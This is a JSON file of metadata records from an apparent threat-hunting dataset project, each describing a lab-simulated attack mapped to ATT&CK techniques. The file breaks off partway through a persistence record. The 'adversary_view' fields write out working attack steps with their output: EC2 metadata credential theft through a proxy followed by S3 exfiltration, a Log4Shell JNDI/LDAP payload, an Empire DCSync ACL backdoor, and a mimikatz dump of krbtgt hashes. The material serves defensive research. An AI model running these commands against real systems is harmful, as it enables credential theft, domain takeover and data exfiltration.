{
    "datasets/atomic/_metadata/SDAWS-200914011940.yaml": {
        "title": "AWS Cloud Bank Breach S3",
        "id": "SDAWS-200914011940",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/09/13",
        "modification_date": "2020/09/13",
        "platform": [
            "AWS"
        ],
        "type": "atomic",
        "tags": [
            "EC2 Proxy Abuse",
            "S3 Data Exfiltration"
        ],
        "description": "This dataset represents adversaries abusing a misconfigured EC2 reverse proxy to obtain instance profile keys and eventually exfiltrate files from an S3 bucket.",
        "attack_mappings": [
            {
                "technique": "T1078",
                "sub-technique": "004",
                "tactics": [
                    "TA0001",
                    "TA0003",
                    "TA0004",
                    "TA0005"
                ]
            },
            {
                "technique": "T1530",
                "sub-technique": null,
                "tactics": [
                    "TA0009"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "cloud",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/aws/collection/ec2_proxy_s3_exfiltration.zip"
            }
        ],
        "simulation": {
            "environment": "https://github.com/OTRF/mordor-labs/tree/master/environments/aws/cloud-breach-s3",
            "tools": [
                {
                    "type": "Cloud Formation Templates",
                    "name": "AWS CLI",
                    "module": "Exfiltration",
                    "script": "https://github.com/OTRF/mordor-labs/tree/master/environments/aws/cloud-breach-s3"
                }
            ],
            "permissions_required": [
                "user"
            ],
            "adversary_view": "> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/ -H \"Host:169.254.169.254\"                                            \nMordorNginxStack-BankingWAFRole-9S3E0UAE1MM0                                                                                                                                                              >\n\n> curl -s http://35.174.154.220/latest/meta-data/iam/security-credentials/MordorNginxStack-BankingWAFRole-9S3E0UAE1MM0 -H \"Host:169.254.169.254\"\n{\n\"Code\" : \"Success\",\n\"LastUpdated\" : \"2020-09-14T00:49:26Z\",\n\"Type\" : \"AWS-HMAC\",\n\"AccessKeyId\" : \"ASIA5FLZVX4OPVKKVBMX\",\n\"SecretAccessKey\" : \"aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\",\n\"Token\" : \"TOKEN\",\n\"Expiration\" : \"2020-09-14T07:10:27Z\"\n}\n\n> aws configure --profile erratic\nAWS Access Key ID [None]: ASIA5FLZVX4OPVKKVBMX\nAWS Secret Access Key [None]: aD8Hchl4f1BrbfgFvwEBVRZ0oCXrifESaC3B0a03\nDefault region name [None]: us-east-1\nDefault output format [None]: json\n\n> echo aws_session_token = \"TOKEN\" >> ~/.aws/credentials \n\n> aws s3 ls --profile erratic\n2020-09-13 20:00:32 mordorctstack-s3bucketforcloudtrail-1gj7vvt2ul642\n2020-09-13 19:59:59 mordors3stack-s3bucket-llp2yingx64a\n\n> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic\n2020-09-13 20:00:26         89 ring.txt\n\n> aws s3 ls mordors3stack-s3bucket-llp2yingx64a --profile erratic\n2020-09-13 20:00:26         89 ring.txt\n\n> aws s3 sync s3://mordors3stack-s3bucket-llp2yingx64a . --profile erratic                                   \ndownload: s3://mordors3stack-s3bucket-llp2yingx64a/ring.txt to ./ring.txt"
        },
        "references": [
            "https://github.com/RhinoSecurityLabs/cloudgoat/tree/master/scenarios/cloud_breach_s3"
        ],
        "mp_last_updated": "2022-01-08T01:49:23.026332+00:00"
    },
    "datasets/atomic/_metadata/SDLIN-201110074812.yaml": {
        "title": "Arp Cache Discovery",
        "id": "SDLIN-201110074812",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/11/10",
        "modification_date": "2020/11/10",
        "platform": [
            "Linux"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor using arp to list out the arp cache.",
        "attack_mappings": [
            {
                "technique": "T1018",
                "sub-technique": null,
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/discovery/host/sh_arp_cache.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "sh",
                    "module": "sh",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-6---remote-system-discovery---arp-nix"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "wardog@UBUNTU5:~$ arp -a | grep -v '^?'\n_gateway (192.168.2.1) at 12:34:56:78:9a:bc [ether] on eth0 "
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1018/T1018.md#atomic-test-6---remote-system-discovery---arp-nix"
        ],
        "mp_last_updated": "2022-01-08T01:49:23.196332+00:00"
    },
    "datasets/atomic/_metadata/SDLIN-201110081941.yaml": {
        "title": "DD Binary Padding Hash Change",
        "id": "SDLIN-201110081941",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2020/11/10",
        "modification_date": "2020/11/10",
        "platform": [
            "Linux"
        ],
        "type": "atomic",
        "tags": null,
        "description": "This dataset represents a threat actor using dd to add a zero to the binary to change the hash.",
        "attack_mappings": [
            {
                "technique": "T1027",
                "sub-technique": "001",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/defense_evasion/host/sh_binary_padding_dd.zip"
            }
        ],
        "simulation": {
            "environment": "Lab VM",
            "tools": [
                {
                    "type": "Manual",
                    "name": "sh",
                    "module": "sh",
                    "script": "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "md5sum /tmp/psexec.py \n5aa8b93e9b40c04d6d9d0cc8cd3975ed  /tmp/psexec.py\n\ndd if=/dev/zero bs=1 count=1 >> /tmp/psexec.py \n1+0 records in\n1+0 records out\n1 byte copied, 5.6002e-05 s, 17.9 kB/s\n\nmd5sum /tmp/psexec.py \nc509e5bd899de81d603da3f61e717837  /tmp/psexec.py"
        },
        "references": [
            "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1027.001/T1027.001.md#atomic-test-1---pad-binary-to-change-hash---linuxmacos-dd"
        ],
        "mp_last_updated": "2022-01-08T01:49:23.388332+00:00"
    },
    "datasets/atomic/_metadata/SDLIN-211214154100.yaml": {
        "title": "Log4jShell LDAP JNDI Lookup",
        "id": "SDLIN-211214154100",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2021/12/14",
        "modification_date": "2021/12/14",
        "platform": [
            "Linux"
        ],
        "type": "atomic",
        "tags": null,
        "description": "The JNDI lookup feature of log4j allows variables to be retrieved via JNDI - Java Naming and Directory Interface. This is an API that that provides naming and directory functionality to Java applications.",
        "attack_mappings": [
            {
                "technique": "T1190",
                "sub-technique": null,
                "tactics": [
                    "TA0001"
                ]
            },
            {
                "technique": "T1203",
                "sub-technique": null,
                "tactics": [
                    "TA0002"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/linux/initial_access/network/log4jshell_reversheshell_netcat.zip"
            }
        ],
        "simulation": {
            "environment": "Microsoft Sentinel To-Go",
            "tools": [
                {
                    "type": "Manual",
                    "name": "sh",
                    "module": "sh",
                    "script": "https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "java -cp target/Log4jLabProject-1.0-SNAPSHOT-all.jar com.log4jshell.App '${jndi:ldap://192.168.2.6:1389/Run}'"
        },
        "references": [
            "https://isc.sans.edu/diary/RCE+in+log4j%2C+Log4Shell%2C+or+how+things+can+get+bad+quickly/28120",
            "https://github.com/OTRF/Microsoft-Sentinel2Go/tree/master/grocery-list/Linux/demos/CVE-2021-44228-Log4Shell",
            "https://github.com/Cyb3rWard0g/log4jshell-lab"
        ],
        "mp_last_updated": "2022-01-08T01:49:23.562332+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190301125905.yaml": {
        "title": "Empire Powerview Add-DomainObjectAcl",
        "id": "SDWIN-190301125905",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/01",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "AD Object Modification",
            "AD Object nTSecurityDescriptor",
            "LDAP ModifyRequest"
        ],
        "description": "This datasets represent adversaries with enough permissions (i.e. domain admin) adding an access control entry (ACE) to the discretionary access control list (DACL) of an Active Directory object (i.e Root Domain). One example could be adversaries modifying the root domain DACL to allow a specific domain user, despite being in no privileged groups and not having local admin rights on the domain controller itself, to use Active Directory replication services and obtain secret domain data (i.e. Other user NTLM Hashes)",
        "attack_mappings": [
            {
                "technique": "T1222",
                "sub-technique": "001",
                "tactics": [
                    "TA0005"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Active Directory Replication User Backdoor",
                "link": "https://threathunterplaybook.com/notebooks/windows/05_defense_evasion/WIN-190101151110.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/host/empire_powerview_ldap_ntsecuritydescriptor.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/defense_evasion/network/empire_powerview_ldap_ntsecuritydescriptor.zip"
            }
        ],
        "simulation": {
            "environment": "https://github.com/OTRF/mordor-labs/tree/master/environments/windows/shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "powerview",
                    "script": "https://github.com/EmpireProject/Empire/blob/master/data/module_source/situational_awareness/network/powerview.ps1"
                }
            ],
            "permissions_required": [
                "Domain Admin"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\nA7BWPR32 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         5904   5/0.0    2020-09-18 18:29:36  http            \nHBEW9G1D ps 172.18.39.6     WORKSTATION6      THESHIRE\\sbeavers       powershell         6036   5/0.0    2020-09-18 18:15:39  http            \nUF5MYK42 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         6404   5/0.0    2020-09-20 21:28:07  http            \n\n8BUCWV1P ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         2488   5/0.0    2020-09-21 17:09:43  http            \n\n(Empire: agents) > interact 8BUCWV1P\n(Empire: 8BUCWV1P) > scriptimport data/module_source/situational_awareness/network/powerview.ps1\n[*] Tasked 8BUCWV1P to run TASK_SCRIPT_IMPORT\n[*] Agent 8BUCWV1P tasked with task ID 1\n(Empire: 8BUCWV1P) > \nscript successfully saved in memory\n\n(Empire: 8BUCWV1P) > scriptcmd Add-DomainObjectAcl -TargetIdentity \"dc=theshire,dc=local\" -TargetDomain theshire.local -PrincipalIdentity nmartha -Rights DCSync\n[*] Tasked 8BUCWV1P to run TASK_SCRIPT_COMMAND\n[*] Agent 8BUCWV1P tasked with task ID 2\n(Empire: 8BUCWV1P) > \nJob started: 5WSPKL\n\n(Empire: 8BUCWV1P) > scriptcmd $nmarthaSid = Get-DomainUser nmartha | Select-Object -ExpandProperty objectsid; Get-DomainObjectACL  \"dc=theshire,dc=local\" -Domain theshire.local -ResolveGUIDs | Where-Object {$_.securityidentifier -eq $nmarthaSid}\n[*] Tasked 8BUCWV1P to run TASK_SCRIPT_COMMAND\n[*] Agent 8BUCWV1P tasked with task ID 3\n(Empire: 8BUCWV1P) > \nJob started: YG1ZB3\n\nAceQualifier           : AccessAllowed\nObjectDN               : DC=theshire,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : DS-Replication-Get-Changes-In-Filtered-Set\nObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\nAceQualifier           : AccessAllowed\nObjectDN               : DC=theshire,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : DS-Replication-Get-Changes\nObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0\n\nAceQualifier           : AccessAllowed\nObjectDN               : DC=theshire,DC=local\nActiveDirectoryRights  : ExtendedRight\nObjectAceType          : DS-Replication-Get-Changes-All\nObjectSID              : S-1-5-21-4228717743-1032521047-1810997296\nInheritanceFlags       : None\nBinaryLength           : 56\nAceType                : AccessAllowedObject\nObjectAceFlags         : ObjectAceTypePresent\nIsCallback             : False\nPropagationFlags       : None\nSecurityIdentifier     : S-1-5-21-4228717743-1032521047-1810997296-1103\nAccessMask             : 256\nAuditFlags             : None\nIsInherited            : False\nAceFlags               : None\nInheritedObjectAceType : All\nOpaqueLength           : 0"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:23.737334+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190301174830.yaml": {
        "title": "Empire DCSync",
        "id": "SDWIN-190301174830",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/01",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "AD Replication services",
            "RPC DRSUAPI DsGetNCChanges"
        ],
        "description": "This dataset represents adversaries abusing Active Directory Replication services to retrieve secret domain data (i.e. NTLM hashes) from domain accounts.",
        "attack_mappings": [
            {
                "technique": "T1003",
                "sub-technique": "006",
                "tactics": [
                    "TA0006"
                ]
            }
        ],
        "notebooks": [
            {
                "project": "Threat Hunter Playbook",
                "name": "Active Directory Replication From Non-Domain-Controller Accounts",
                "link": "https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-180815210510.html"
            }
        ],
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/host/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip"
            },
            {
                "type": "Network",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/credential_access/network/empire_dcsync_dcerpc_drsuapi_DsGetNCChanges.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "DCSync",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/credentials/Invoke-DCSync.ps1"
                }
            ],
            "permissions_required": [
                "Domain Admin"
            ],
            "adversary_view": "(Empire: stager/multi/launcher) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 22:56:58  http            \n\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > \n(Empire: 1EHYPBVC) > usemodule credentials/mimikatz/dcsync\n(Empire: powershell/credentials/mimikatz/dcsync) > set user krbtgt\n(Empire: powershell/credentials/mimikatz/dcsync) > set domain theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > set dc MORDORDC.theshire.local\n(Empire: powershell/credentials/mimikatz/dcsync) > info\n\n              Name: Invoke-Mimikatz DCsync\n            Module: powershell/credentials/mimikatz/dcsync\n        NeedsAdmin: False\n        OpsecSafe: True\n          Language: powershell\nMinLanguageVersion: 2\n        Background: True\n  OutputExtension: None\n\nAuthors:\n  @gentilkiwi\n  Vincent Le Toux\n  @JosephBialek\n\nDescription:\n  Runs PowerSploit's Invoke-Mimikatz function to extract a\n  given account password through Mimikatz's lsadump::dcsync\n  module. This doesn't need code execution on a given DC, but\n  needs to be run from a user context with DA equivalent\n  privileges.\n\nComments:\n  http://blog.gentilkiwi.com http://clymb3r.wordpress.com/\n\nOptions:\n\n  Name   Required    Value                     Description\n  ----   --------    -------                   -----------\n  Agent  True        1EHYPBVC                  Agent to run module on.                 \n  user   True        krbtgt                    Username to extract the hash for        \n                                              (domain\\username format).               \n  domain False       theshire.local            Specified (fqdn) domain to pull for the \n                                              primary domain/DC.                      \n  dc     False       MORDORDC.theshire.local   Specified (fqdn) domain controller to   \n                                              pull replication data from.             \n\n(Empire: powershell/credentials/mimikatz/dcsync) > execute\n[*] Tasked 1EHYPBVC to run TASK_CMD_JOB\n[*] Agent 1EHYPBVC tasked with task ID 1\n[*] Tasked agent 1EHYPBVC to run module powershell/credentials/mimikatz/dcsync\n(Empire: powershell/credentials/mimikatz/dcsync) > \nJob started: 5PKMSU\n\nHostname: WORKSTATION5.theshire.local / S-1-5-21-4228717743-1032521047-1810997296\n\n  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2020 20:07:46\n.## ^ ##.  \"A La Vie, A L'Amour\" - (oe.eo)\n## / \\ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )\n## \\ / ##       > http://blog.gentilkiwi.com/mimikatz\n'## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )\n  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/\n\nmimikatz(powershell) # lsadump::dcsync /user:krbtgt /domain:theshire.local /dc:MORDORDC.theshire.local\n[DC] 'theshire.local' will be the domain\n[DC] 'MORDORDC.theshire.local' will be the DC server\n[DC] 'krbtgt' will be the user account\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   : \nPassword last change : 9/17/2020 11:14:46 AM\nObject Security ID   : S-1-5-21-4228717743-1032521047-1810997296-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: c2547afe54ff225a546c48805714d000\n    ntlm- 0: c2547afe54ff225a546c48805714d000\n    lm  - 0: 376c6c28a8cfd97055be910640a24428\n\nSupplemental Credentials:\n* Primary:NTLM-Strong-NTOWF *\n    Random Value : a69dcd105b2fc3955a3f52ca00a26902\n\n* Primary:Kerberos-Newer-Keys *\n    Default Salt : THESHIRE.LOCALkrbtgt\n    Default Iterations : 4096\n    Credentials\n      aes256_hmac       (4096) : 2954d183aaca51936dea10ea187e198814fa57b136733ca167b5d3fcc5b6ab2a\n      aes128_hmac       (4096) : a8811f9942540c8f10c3837a6975d446\n      des_cbc_md5       (4096) : e36d674cc7c8b983\n\n* Primary:Kerberos *\n    Default Salt : THESHIRE.LOCALkrbtgt\n    Credentials\n      des_cbc_md5       : e36d674cc7c8b983\n\n* Packages *\n    NTLM-Strong-NTOWF\n\n* Primary:WDigest *\n    01  774cc07151941eb115c0fd700fa5715b\n    02  6a75ae70376df6a3a3e23f560890ac90\n    03  cd5fa9ee1e6ab120cd6edb6970f56f38\n    04  774cc07151941eb115c0fd700fa5715b\n    05  6a75ae70376df6a3a3e23f560890ac90\n    06  168d6e12549fcbfa3931ffe79e6a978f\n    07  774cc07151941eb115c0fd700fa5715b\n    08  c2fc61fda20bbacb17fb29b10d7b8144\n    09  c2fc61fda20bbacb17fb29b10d7b8144\n    10  2985ad74f9f6f53e7533662687998542\n    11  4f58b2e2f9e8505a4b364b5c7bb0f0c5\n    12  c2fc61fda20bbacb17fb29b10d7b8144\n    13  61c34cf9f0bb6f8062250ffff84cda07\n    14  4f58b2e2f9e8505a4b364b5c7bb0f0c5\n    15  8a1d00b5e9c900715124c0998c19b909\n    16  8a1d00b5e9c900715124c0998c19b909\n    17  da88e05b3fe5adc93f5838eb33fadb98\n    18  45d131a894f854b5400167647aa5ae0f\n    19  2a1e106ba660636a95def3aad248ca6c\n    20  c05fa8a38b50e8c9088d3a64a7659817\n    21  28c03b871631ef39fc8cbc7fbb8e52e8\n    22  28c03b871631ef39fc8cbc7fbb8e52e8\n    23  5e1dceb9c5260211633323b398af827d\n    24  e3b40de14a439d9c18c57cc60002c5f5\n    25  e3b40de14a439d9c18c57cc60002c5f5\n    26  e52cde43b834f641f9f80190b29064a7\n    27  3b2e4b4ad448b19043d422dc9bf4fadc\n    28  0c45e5c4ef958888593d806c650f0e3d\n    29  1822249537162bad7b9808ae6b51c627"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:24.208332+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319020147.yaml": {
        "title": "Empire Net Local Administrators Group",
        "id": "SDWIN-190319020147",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Administrators Group Enumeration"
        ],
        "description": "This dataset represents adversaries enumerating members of the local Administratrors group via the net.exe utility",
        "attack_mappings": [
            {
                "technique": "T1069",
                "sub-technique": "001",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_shell_net_localgroup_administrators.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": "net localgroup Administrators"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: 1EHYPBVC) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:18:05  http            \n\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net localgroup Administrators\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 2\n(Empire: 1EHYPBVC) > \nAlias name     Administrators\nComment        Administrators have complete and unrestricted access to the computer/domain\n\nMembers\n\n-------------------------------------------------------------------------------\nTHESHIRE\\Domain Admins\nwardog\nThe command completed successfully.\n\n\n..Command execution completed.\n\n(Empire: 1EHYPBVC) >"
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:24.381334+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319020729.yaml": {
        "title": "Empire Net Local Users",
        "id": "SDWIN-190319020729",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Users Enumeration"
        ],
        "description": "This dataset represents adversaries enumerating all local users on an endpoint",
        "attack_mappings": [
            {
                "technique": "T1087",
                "sub-technique": "001",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_shell_net_local_users.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": "net user"
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: 1EHYPBVC) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http            \n\n(Empire: agents) > interact 1EHYPBVC\n(Empire: 1EHYPBVC) > shell net user\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 3\n(Empire: 1EHYPBVC) > \nUser accounts for \\\\WORKSTATION5\n\n-------------------------------------------------------------------------------\nDefaultAccount           Guest                    wardog                   \nWDAGUtilityAccount       \nThe command completed successfully.\n\n..Command execution completed.\n\n(Empire: 1EHYPBVC) > "
        },
        "references": [
            "https://docs.microsoft.com/en-us/windows/win32/netmgmt/user-functions"
        ],
        "mp_last_updated": "2022-01-08T01:49:24.555333+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319021158.yaml": {
        "title": "Empire Net Domain Users",
        "id": "SDWIN-190319021158",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/20",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Domain Users Enumeration",
            "RPC SAMR EnumDomainUsers"
        ],
        "description": "This dataset represents adversaries enumerating all users that belong to a domain via RPC SAMR EnumDomainUsers.",
        "attack_mappings": [
            {
                "technique": "T1087",
                "sub-technique": "002",
                "tactics": [
                    "TA0007"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/host/empire_shell_samr_EnumDomainUsers.zip"
            },
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/discovery/network/empire_shell_samr_EnumDomainUsers.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "shell",
                    "script": null
                }
            ],
            "permissions_required": [
                "User"
            ],
            "adversary_view": "(Empire: 1EHYPBVC) > agents\n\n[*] Active agents:\n\nName     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen            Listener\n----     -- -----------     ------------      --------                -------            ---    -----    ---------            ----------------\n4SUZ8X62 ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         4092   5/0.0    2020-09-21 21:59:29  http            \n1EHYPBVC ps 172.18.39.5     WORKSTATION5      *THESHIRE\\pgustavo      powershell         7456   5/0.0    2020-09-21 23:25:39  http            \n\n(Empire: agents) > interact 1EHYPBVC\n\n(Empire: 1EHYPBVC) > shell net user /domain\n[*] Tasked 1EHYPBVC to run TASK_SHELL\n[*] Agent 1EHYPBVC tasked with task ID 5\n(Empire: 1EHYPBVC) > \nThe request will be processed at a domain controller for domain theshire.local.\n\nUser accounts for \\\\MORDORDC.theshire.local\n\n-------------------------------------------------------------------------------\ndschrute                 Guest                    krbtgt                   \nlrodriguez               mscott                   nmartha                  \npbeesly                  pgustavo                 sbeavers                 \nsysmonsvc                wardog                   \nThe command completed successfully.\n\n..Command execution completed.\n\n(Empire: 1EHYPBVC) > "
        },
        "references": null,
        "mp_last_updated": "2022-01-08T01:49:24.740332+00:00"
    },
    "datasets/atomic/_metadata/SDWIN-190319023812.yaml": {
        "title": "Empire Userland Registry Run Keys",
        "id": "SDWIN-190319023812",
        "contributors": [
            "Roberto Rodriguez @Cyb3rWard0g"
        ],
        "creation_date": "2019/03/19",
        "modification_date": "2020/09/04",
        "platform": [
            "Windows"
        ],
        "type": "atomic",
        "tags": [
            "Local Registry Modification",
            "Registry Run Keys"
        ],
        "description": "This dataset represents adversaries modifying local Run registry keys (i.e. HKLM:SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run) for persistence. It also captures the execution of the persistence mechanism.",
        "attack_mappings": [
            {
                "technique": "T1547",
                "sub-technique": "001",
                "tactics": [
                    "TA0003"
                ]
            }
        ],
        "notebooks": null,
        "files": [
            {
                "type": "Host",
                "link": "https://raw.githubusercontent.com/OTRF/Security-Datasets/master/datasets/atomic/windows/persistence/host/empire_persistence_registry_modification_run_keys_standard_user.zip"
            }
        ],
        "simulation": {
            "environment": "Mordor shire",
            "tools": [
                {
                    "type": "C2",
                    "name": "Empire",
                    "module": "Registry",
                    "script": "https://github.com/EmpireProject/Empire/blob/dev/data/module_source/persistence/Persistence.psm1"
                }
            ],
            "permissions_required": [
                "Standard User"
            ],
